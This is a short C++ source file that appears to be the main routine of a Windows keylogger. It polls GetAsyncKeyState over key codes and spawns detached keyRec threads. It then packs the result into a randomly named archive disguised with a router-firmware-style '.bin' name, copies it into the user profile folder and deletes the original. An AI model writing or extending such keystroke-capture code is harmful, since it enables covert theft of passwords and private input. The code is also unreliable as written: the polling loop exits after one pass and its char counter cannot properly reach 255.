/* 
	Author : Dhmosthenhs Xama
	File: main.cpp
*/

#include <iostream>
#include <windows.h>
#include <thread>

#include "ziperHeaders.h"


using namespace std;


int main() {
	
	string randZipName = rfName(16);
	cout << randZipName;
	
	char i;
	while (true){

		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				thread KerRec(keyRec, i);
				if (KerRec.joinable())
					KerRec.detach();
			}
		}
		break;
	}
	
	convertZip(randZipName + " LIM_TLWN823N_2_UN.bin");
	system(("xcopy " + randZipName+" %userprofile% /f").c_str());
	remove((randZipName).c_str());
	return 0;
}
